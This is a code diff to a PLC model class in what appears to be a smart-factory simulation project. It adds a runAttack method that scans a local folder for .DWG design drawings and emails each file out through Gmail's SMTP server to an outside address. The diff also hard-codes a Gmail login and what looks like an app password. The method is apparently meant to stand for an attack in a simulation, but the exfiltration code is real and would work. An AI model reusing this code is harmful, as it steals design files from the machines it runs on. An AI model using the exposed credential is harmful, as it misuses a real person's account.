@@ -1,3 +1,11 @@
+import os
+import smtplib
+
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
 from src.ATOMIC_MODELS import *
 
 class PLC(ATOMIC_MODELS):
@@ -40,4 +48,38 @@ class PLC(ATOMIC_MODELS):
 
     def runAttack(self):
         print("ATTACK")
-        pass
+
+        dir = "D:\git\DEVS-Python\projects\smartfactory"
+        files = os.listdir(dir)
+
+        for file in files:
+            extension = os.path.splitext(file)[1]
+            if extension == ".DWG":
+                filename = dir + '\\' + file
+                self.sendEmail(filename)
+
+            print(extension)
+    
+    def sendEmail(self, filename):
+        # 세션생성, 로그인
+        s = smtplib.SMTP('smtp.gmail.com', 587)
+        s.starttls()
+        s.login('sumannam', 'knmrpoxtssgchpdb')
+
+        # 제목, 본문 작성
+        msg = MIMEMultipart()
+        msg['Subject'] = 'dwg file'
+        msg.attach(MIMEText('본문', 'plain'))
+
+        # 파일첨부 (파일 미첨부시 생략가능)
+
+        attachment = open(filename, 'rb')
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload((attachment).read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', "attachment; filename= " + filename)
+        msg.attach(part)
+
+        # 메일 전송
+        s.sendmail("sumannam@gmail.com", "sumannam@naver.com", msg.as_string())
+        s.quit()
